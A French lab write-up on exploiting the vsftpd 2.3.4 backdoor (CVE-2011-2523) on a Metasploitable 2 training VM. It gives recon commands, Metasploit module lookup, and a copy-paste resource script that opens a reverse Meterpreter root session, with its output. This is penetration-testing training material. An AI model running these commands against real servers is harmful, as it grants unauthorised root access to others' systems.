# Write-up — vsftpd 2.3.4 Backdoor (Metasploitable 2, port 21)

Cible : `172.28.128.5` · CVE-2011-2523 · Résultat : shell **root** direct.

Tout ce qui suit est copier-coller direct (testé en zsh), uniquement côté 🖥 Kali — pas de
manipulation nécessaire sur la VM pour ce service.

---

## 1. Recon

```bash
nmap -sV -p 21 172.28.128.5
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

## 2. Méthode d'identification de la CVE et du module

À partir de la version exacte trouvée en recon (`vsftpd 2.3.4`), première question
indépendante de tout outil : **cette version a-t-elle une faille connue ?**

```bash
searchsploit vsftpd 2.3.4
```
```
vsftpd 2.3.4 - Backdoor Command Execution      | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me  | unix/remote/17491.rb
```

Confirmé — un exploit existe. `searchsploit` ne donne ni la CVE ni un chemin de module
Metasploit directement utilisable, donc étape suivante : chercher **dans `msfconsole`**
puisque c'est l'outil choisi pour l'exploitation :

```bash
msfconsole -q -x "search vsftpd; exit"
```
```
#  Full Name                             Disclosure Date  Rank       Check  Name
-  ---------                             ---------------  ----       -----  ----
0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 and Earlier STAT Denial of Service
1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
```

**C'est de là que vient le chemin exact `exploit/unix/ftp/vsftpd_234_backdoor`** — deux
résultats remontent, mais un seul correspond à la version 2.3.4 précise (`vsftpd_232` vise
une version antérieure et différente, un simple DoS). Reste à obtenir la CVE elle-même,
absente des deux résultats précédents :

```bash
msfconsole -q -x "info exploit/unix/ftp/vsftpd_234_backdoor; exit"
```
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2011-2523
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```

**CVE-2011-2523.** Entre le 30 juin et le 3 juillet 2011, l'archive source officielle de
vsftpd 2.3.4 a été remplacée par une version trafiquée sur le serveur de téléchargement du
mainteneur (compromission de la chaîne de distribution, pas une faille de code dans la
version légitime). Si le nom d'utilisateur envoyé au login FTP contient `:)`, le serveur
ouvre un **shell root** en écoute sur le port **6200**, sans authentification
supplémentaire. Metasploitable 2 embarque délibérément cette version trafiquée.

Le module Metasploit existe déjà (`exploit/unix/ftp/vsftpd_234_backdoor`), pas besoin d'en
écrire un à la main.

## 3. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/vsftpd.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.5
set RPORT 21
set LHOST 172.28.128.1
exploit -z
sessions -l
sessions -i 1 -c id
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/vsftpd.rc
```

Résultat :
```
[*] Started reverse TCP handler on 172.28.128.1:4444
[+] 172.28.128.5:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected
[+] 172.28.128.5:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (172.28.128.1:4444 -> 172.28.128.5:35551)

Id  Name  Type                   Information                        Connection
1         meterpreter x86/linux  root @ metasploitable.localdomain  172.28.128.1:4444 -> ...

uid=0(root) gid=0(root)
```

→ **Session Meterpreter complète**, pas juste un shell de commandes — le module envoie un
nom d'utilisateur contenant `:)`, attend l'ouverture du port 6200 côté cible, puis y injecte
un stager Meterpreter.

**Note :** `LHOST` est nécessaire car le payload par défaut de ce module
(`cmd/linux/http/x86/meterpreter_reverse_tcp`, visible dans son code source via
`DefaultOptions['PAYLOAD']`) est un reverse Meterpreter — comme tout payload reverse, il a
besoin de savoir où rappeler.

→ **Root direct**, sans étape d'élévation de privilèges — contrairement à `distcc` (MS1,
shell `daemon`) ou `mod_copy` (MS3, shell `www-data`), aucune ACL ni condition réseau à
satisfaire : exploitation reproductible à l'identique à chaque run, immédiate.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis
directement l'étape 3 — pas de recon approfondie ni de diagnostic nécessaire, c'est la
backdoor la plus directe du parcours.

**Suite du parcours MS2 :** UnrealIRCd (port 6667), même famille de vulnérabilité (backdoor
dans un tarball officiel compromis).
